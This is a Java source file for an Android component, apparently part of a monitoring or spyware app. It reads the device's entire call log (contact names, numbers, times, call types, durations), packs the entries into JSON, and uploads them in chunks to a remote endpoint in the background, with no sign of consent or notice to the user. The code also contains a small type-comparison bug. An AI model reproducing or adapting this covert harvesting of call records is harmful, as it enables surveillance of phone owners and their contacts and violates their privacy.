package com.inet.android.list;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.provider.CallLog;

import com.inet.android.request.RequestList;
import com.inet.android.utils.ConvertDate;
import com.inet.android.utils.Logging;

/**
 * ListCall class is designed to get the list of call
 * 
 * @author johny homicide
 * 
 */
public class ListCall extends AsyncTask<Context, Void, Void> {
	Context mContext;
	private String iType = "1";;
	private String LOG_TAG = ListCall.class.getSimpleName().toString();
	private String complete;
	private String version;
	private String readCallLogs() {
		
		String sendStr = null;
		String type = "0";
		SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(mContext);
		version = sp.getString("list_call", "0");
		Logging.doLog(LOG_TAG, "readCall", "readCall");

		if (sp.getBoolean("network_available", true) == true) {

			Cursor callLogCursor = null;
			// Делаем запрос к контент-провайдеру
			// и получаем все данные из таблицы

			complete = "0";
			callLogCursor = mContext.getContentResolver().query(
					android.provider.CallLog.Calls.CONTENT_URI, null, null,
					null, android.provider.CallLog.Calls.DEFAULT_SORT_ORDER);

			if (callLogCursor != null) {
				JSONObject archiveCallJson = new JSONObject();

				// Проходим в цикле, пока не дойдём до последней записи

				while (callLogCursor.moveToNext()) {

					// Имя контакта
					String name = callLogCursor.getString(callLogCursor
							.getColumnIndex(CallLog.Calls.CACHED_NAME));

					String cacheNumber = callLogCursor.getString(callLogCursor
							.getColumnIndex(CallLog.Calls.CACHED_NUMBER_LABEL));
					// Номер контакта и т.д.
					String number = callLogCursor.getString(callLogCursor
							.getColumnIndex(CallLog.Calls.NUMBER));
					// String name = getNumber.getContactName(callLogCursor
					// .getString(callLogCursor
					// .getColumnIndex("address")))
					long dateTimeMillis = callLogCursor.getLong(callLogCursor
							.getColumnIndex(CallLog.Calls.DATE));
					// long durationMillis = callLogCursor.getLong(callLogCursor
					// .getColumnIndex(CallLog.Calls.DURATION));
					int callType = callLogCursor.getInt(callLogCursor
							.getColumnIndex(CallLog.Calls.TYPE));
					int durationInt = callLogCursor
							.getColumnIndex(CallLog.Calls.DURATION);
					String duration = callLogCursor.getString(durationInt);

					String dateString = ConvertDate.getData(dateTimeMillis);

					if (cacheNumber == null)
						cacheNumber = number;
					if (name == null)
						name = "No Name";
					if (callType == CallLog.Calls.OUTGOING_TYPE) {
						type = "3";
					} else if (callType == CallLog.Calls.INCOMING_TYPE) {
						type = "2";
					} else if (callType == CallLog.Calls.MISSED_TYPE) {
						type = "4";
					}
					try {
						archiveCallJson.put("time", dateString);
						archiveCallJson.put("number", number);
						archiveCallJson.put("type", type);
						archiveCallJson.put("name", name);
						if (!type.equals(3))
							archiveCallJson.put("duration", duration);
						if (sendStr == null)
							sendStr = archiveCallJson.toString();
						else
							sendStr += "," + archiveCallJson.toString();

					} catch (JSONException e) {
						// TODO Автоматически созданный блок catch
						e.printStackTrace();
					}
					if (sendStr.length() >= 50000) {

						Logging.doLog(LOG_TAG, "str >= 50000", "str >= 50000");
						sendRequest(sendStr, complete);
						sendStr = null;
					}
				}
				if (sendStr != null) {
					lastRaw(sendStr);
					sendStr = null;
				} else {
					lastRaw("");
					sendStr = null;
				}
				Logging.doLog(LOG_TAG, "callLogCursor.close()",
						"callLogCursor.close()");
				callLogCursor.close();
			} else {
				Logging.doLog(LOG_TAG, "callLogCursor == null",
						"callLogCursor == null");
				lastRaw("");
				sendStr = null;
			}
		} else {
			endList();
			sendStr = null;
		}
		return null;
	}

	private void endList() {
		Logging.doLog(LOG_TAG, "endList", "endList");	
		TurnSendList.setList(iType, version, "0", mContext);
	}

	private void lastRaw(String sendStr) {
		complete = "1";
		Logging.doLog(LOG_TAG, "Send complete 1 ..", "Send complete 1 ..");
		sendRequest(sendStr, complete);
	}

	private void sendRequest(String str, String complete) {
		RequestList.sendDemandRequest(str, iType, complete, version, mContext);
	}

	@Override
	protected Void doInBackground(Context... params) {
		// TODO Автоматически созданная заглушка метода
		Logging.doLog(LOG_TAG, "doIn");
		this.mContext = params[0];
		readCallLogs();
		return null;
	}

	@Override
	protected void onPostExecute(Void result) {
		// TODO Auto-generated method stub
		super.onPostExecute(result);
	}

}
